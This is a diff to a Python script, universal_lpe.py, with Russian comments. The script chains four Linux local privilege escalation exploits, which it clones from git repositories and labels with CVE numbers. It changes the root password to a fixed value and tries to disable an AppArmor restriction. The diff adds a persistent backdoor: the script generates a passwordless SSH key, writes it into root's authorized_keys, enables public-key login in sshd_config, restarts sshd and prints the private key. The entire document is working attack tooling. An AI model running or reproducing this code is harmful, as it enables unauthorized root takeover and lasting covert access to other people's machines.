@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# universal_lpe.py - Tries all 4 LPE exploits, changes root password to 'noddened'
+# universal_lpe.py - Tries all 4 LPE exploits, changes root password to 'noddened' and sets up SSH key
 
 import subprocess
 import os
@@ -12,6 +12,8 @@ from pathlib import Path
 
 NEW_PASSWORD = "noddened"
 WORK_DIR = tempfile.mkdtemp(prefix=".x_")
+SSH_KEY_PATH = "/tmp/.rootkey"
+SSH_PUBKEY_PATH = "/tmp/.rootkey.pub"
 
 # Репозитории эксплойтов
 REPOS = {
@@ -23,22 +25,90 @@ REPOS = {
 
 def cleanup():
     shutil.rmtree(WORK_DIR, ignore_errors=True)
+    # Подчищаем временные ключи
+    if os.path.exists(SSH_KEY_PATH):
+        os.remove(SSH_KEY_PATH)
+    if os.path.exists(SSH_PUBKEY_PATH):
+        os.remove(SSH_PUBKEY_PATH)
+
+def setup_ssh_key():
+    """Генерирует SSH-ключи, добавляет публичный в /root/.ssh/authorized_keys.
+    Возвращает содержимое приватного ключа или None при ошибке."""
+    try:
+        # Удаляем старые временные ключи, если есть
+        for f in [SSH_KEY_PATH, SSH_PUBKEY_PATH]:
+            if os.path.exists(f):
+                os.remove(f)
+
+        # Генерируем новую пару ключей без пароля
+        subprocess.run(
+            ["ssh-keygen", "-t", "ed25519", "-f", SSH_KEY_PATH, "-N", "", "-q"],
+            capture_output=True,
+            timeout=10
+        )
+
+        if not os.path.exists(SSH_PUBKEY_PATH):
+            return None
+
+        # Создаём /root/.ssh если нет
+        root_ssh = "/root/.ssh"
+        if not os.path.exists(root_ssh):
+            os.makedirs(root_ssh, mode=0o700)
+
+        # Читаем публичный ключ
+        with open(SSH_PUBKEY_PATH, "r") as f:
+            pubkey = f.read().strip()
+
+        # Добавляем в authorized_keys
+        auth_file = os.path.join(root_ssh, "authorized_keys")
+        with open(auth_file, "a+") as f:
+            f.seek(0)
+            existing = f.read()
+            if pubkey not in existing:
+                f.write(pubkey + "\n")
+
+        # Правильные права
+        os.chmod(auth_file, 0o600)
+        os.chown(auth_file, 0, 0)
+
+        # Включаем PubkeyAuthentication в sshd_config на всякий случай
+        sshd_config = "/etc/ssh/sshd_config"
+        if os.path.exists(sshd_config):
+            with open(sshd_config, "r") as f:
+                config = f.read()
+            if "PubkeyAuthentication yes" not in config:
+                with open(sshd_config, "a") as f:
+                    f.write("\nPubkeyAuthentication yes\n")
+                # Пытаемся перезапустить ssh, но не критично, если не получится
+                subprocess.run(["systemctl", "restart", "sshd"], capture_output=True, timeout=5)
+
+        # Читаем приватный ключ
+        with open(SSH_KEY_PATH, "r") as f:
+            private_key = f.read()
+
+        return private_key
+
+    except Exception:
+        return None
 
 def change_password():
-    """Меняет пароль root на noddened. Использует две строки для chpasswd."""
+    """Меняет пароль root на noddened и настраивает SSH-ключ.
+    Возвращает (success, private_key)"""
     try:
-        # Используем Popen для корректной обработки ввода/вывода
+        # Меняем пароль
         proc = subprocess.Popen(['chpasswd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        # ПЕРЕДАЕМ ДВЕ ОДИНАКОВЫЕ СТРОКИ ДЛЯ ПОДТВЕРЖДЕНИЯ ПАРОЛЯ
-        stdout, stderr = proc.communicate(input=f"root:{NEW_PASSWORD}\nroot:{NEW_PASSWORD}")
+        proc.communicate(input=f"root:{NEW_PASSWORD}\nroot:{NEW_PASSWORD}", timeout=5)
+
         if proc.returncode != 0:
-            # Если chpasswd вернул ошибку, выводим ее в stderr для диагностики
-            print(f"Ошибка chpasswd: {stderr}", file=sys.stderr)
-            return False
-        return True
-    except Exception as e:
-        print(f"Ошибка при смене пароля: {e}", file=sys.stderr)
-        return False
+            return False, None
+
+        # Настраиваем SSH-ключ
+        private_key = setup_ssh_key()
+
+        return True, private_key
+
+    except Exception:
+        return False, None
 
 def is_root():
     """Проверяет, является ли текущий пользователь root."""
@@ -47,7 +117,6 @@ def is_root():
 def check_password_change():
     """Проверяет, изменился ли пароль root на 'noddened'."""
     try:
-        # Пытаемся выполнить команду от root с новым паролем
         test_cmd = subprocess.run(
             ["su", "-c", "echo 'password_check_success'", "root"],
             input=f"{NEW_PASSWORD}\n",
@@ -61,7 +130,6 @@ def check_password_change():
 
 def run_dirtyfrag():
     """CVE-2026-43500 - Dirty Frag (RxRPC)"""
-    # Проверка модуля rxrpc
     result = subprocess.run(["lsmod"], capture_output=True, text=True)
     if "rxrpc" not in result.stdout:
         return False
@@ -73,19 +141,15 @@ def run_dirtyfrag():
     if not Path("exp").exists():
         return False
 
-    # Запуск эксплойта. Команду chpasswd убрали, эксплойт только повышает привилегии.
     try:
         proc = subprocess.Popen(["./exp"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        # Просто запускаем эксплойт и ждем
         proc.communicate(timeout=10)
-        # Проверяем, стали ли мы root
         return is_root()
     except:
         return False
 
 def run_copyfail():
     """CVE-2026-31431 - Copy Fail (AF_ALG)"""
-    # Проверка модуля algif_aead
     result = subprocess.run(["lsmod"], capture_output=True, text=True)
     if "algif_aead" not in result.stdout:
         return False
@@ -110,7 +174,6 @@ def run_fragnesia():
     subprocess.run(["git", "clone", "--depth", "1", REPOS["fragnesia"], "fragnesia"], capture_output=True)
     os.chdir("fragnesia")
 
-    # Попытка отключить AppArmor
     apparmor_file = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
     if os.path.exists(apparmor_file):
         try:
@@ -129,7 +192,6 @@ def run_fragnesia():
 
 def run_snapd():
     """CVE-2026-3888 - snap-confine + systemd-tmpfiles"""
-    # Проверка наличия snapd
     result = subprocess.run(["which", "snap"], capture_output=True)
     if result.returncode != 0:
         return False
@@ -152,8 +214,12 @@ def run_snapd():
 def main():
     # Уже root
     if is_root():
-        if change_password() and check_password_change():
+        success, private_key = change_password()
+        if success and check_password_change():
             print("Уже root - Успешно \n Новый пароль от root: noddened")
+            if private_key:
+                print("Приватный ключ SSH:")
+                print(private_key)
         else:
             print("Ошибка повышения привилегий")
         cleanup()
@@ -177,11 +243,15 @@ def main():
     for name, func in exploits:
         try:
             if func():
-                # Двойная проверка: сначала is_root(), потом смена пароля
-                if is_root() and change_password() and check_password_change():
-                    print(f"{name} - Успешно \n Новый пароль от root: noddened")
-                    cleanup()
-                    return
+                if is_root():
+                    success, private_key = change_password()
+                    if success and check_password_change():
+                        print(f"{name} - Успешно \n Новый пароль от root: noddened")
+                        if private_key:
+                            print("Приватный ключ SSH:")
+                            print(private_key)
+                        cleanup()
+                        return
         except Exception:
             continue
 
